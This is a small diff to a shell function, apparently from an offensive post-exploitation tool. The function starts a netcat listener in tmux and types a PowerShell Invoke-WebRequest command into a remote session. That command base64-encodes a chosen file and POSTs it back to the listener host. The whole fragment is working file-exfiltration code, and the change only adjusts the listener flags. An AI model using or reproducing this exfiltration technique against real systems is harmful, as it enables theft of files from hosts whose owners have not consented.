@@ -16,7 +16,7 @@ commander_run() {
     mkdir -p "$dst_dir" || return
   fi
 
-  tmux new-window -d "nc -w 10 -N -nlv \"$lhost\" \"$lport\" > \"$dst_file_b64\"; tail -1 \"$dst_file_b64\" | base64 -d > \"$dst_file\"; rm -f \"$dst_file_b64\""
+  tmux new-window -d "nc -w 10 -N -nlvp \"$lport\" > \"$dst_file_b64\"; tail -1 \"$dst_file_b64\" | base64 -d > \"$dst_file\"; rm -f \"$dst_file_b64\""
 
   tmux send-keys "Invoke-WebRequest -uri http://$lhost:$lport/data.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(\"$file_to_fetch\")))" Enter
 }
